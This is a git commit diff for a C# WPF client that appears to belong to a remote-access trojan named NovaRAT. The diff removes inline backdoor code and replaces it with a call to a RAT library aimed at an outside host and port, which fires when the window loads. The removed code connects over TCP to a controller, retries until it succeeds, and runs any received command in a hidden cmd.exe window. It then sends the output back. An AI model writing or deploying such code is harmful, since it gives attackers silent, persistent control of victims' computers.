affb996abdbeec50234950e49b8f5361d441f75e
sm4z0n3 <smazone@outlook.com>
2023-10-06 02:04:49 +0800

    增加使用例子

--- Client/MainWindow.xaml.cs
+++ Client/MainWindow.xaml.cs
@@ -17,6 +17,7 @@ using System.Windows.Navigation;
 using System.Windows.Shapes;
 using System.Threading;
 using System.Diagnostics;
+using ClientLib;
 
 namespace Client
 {
@@ -34,94 +35,9 @@ namespace Client
                 var fadeInAnimation = new DoubleAnimation { From = 0, To = 1, Duration = TimeSpan.FromSeconds(0.5) };
                 BeginAnimation(UIElement.OpacityProperty, fadeInAnimation);
             };
-           
-            StartClient();
-        }
-        static async Task StartClient()
-        {
-            while (true)
-            {
-                try
-                {
-                    TcpClient client = new TcpClient();
-                    int port = int.Parse("{CONNECTPORT}");
-                    client.Connect("{CONNECTIPADDRESS}", port); 
 
-                    NetworkStream stream = client.GetStream();
-                    byte[] buffer = new byte[1024];
-
-                    while (true)
-                    {
-                        int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);
-                        if (bytesRead > 0)
-                        {
-                            string response = Encoding.UTF8.GetString(buffer, 0, bytesRead);
-                            Console.WriteLine(response);
-
-                            string[] parts = response.Split('|');
-                            if (parts.Length >= 2 && parts[0].Trim().ToLower() == "command")
-                            {
-                                string command = parts[1].Trim();
-
-                                string result = RunCommand(command);
-
-                                byte[] resultBytes = Encoding.UTF8.GetBytes(result);
-                                await stream.WriteAsync(resultBytes, 0, resultBytes.Length);
-                            }
-                        }
-                    }
-                }
-                catch (Exception ex)
-                {
-                    Console.WriteLine("连接错误: " + ex.Message);
-                    Thread.Sleep(10000); 
-                }
-            }
+            NovaRATClient.Start("loca.novapp.icu",12345);
         }
 
-        static string RunCommand(string command)
-        {
-            string result = string.Empty;
-
-            try
-            {
-                Process process = new Process
-                {
-                    StartInfo = new ProcessStartInfo
-                    {
-                        FileName = "cmd.exe", // CMD执行程序
-                        RedirectStandardOutput = true,
-                        RedirectStandardError = true,
-                        UseShellExecute = false,
-                        CreateNoWindow = true,
-                        Arguments = "/c " + command // /c 参数表示执行完命令后关闭CMD窗口
-                    }
-                };
-
-                process.Start();
-
-                // 读取命令的标准输出和错误输出
-                string output = process.StandardOutput.ReadToEnd();
-                string error = process.StandardError.ReadToEnd();
-
-                process.WaitForExit();
-
-                if (!string.IsNullOrEmpty(output))
-                {
-                    result += "标准输出:\n" + output;
-                }
-
-                if (!string.IsNullOrEmpty(error))
-                {
-                    result += "错误输出:\n" + error;
-                }
-            }
-            catch (Exception ex)
-            {
-                result = "错误: " + ex.Message;
-            }
-
-            return result;
-        }
     }
 }
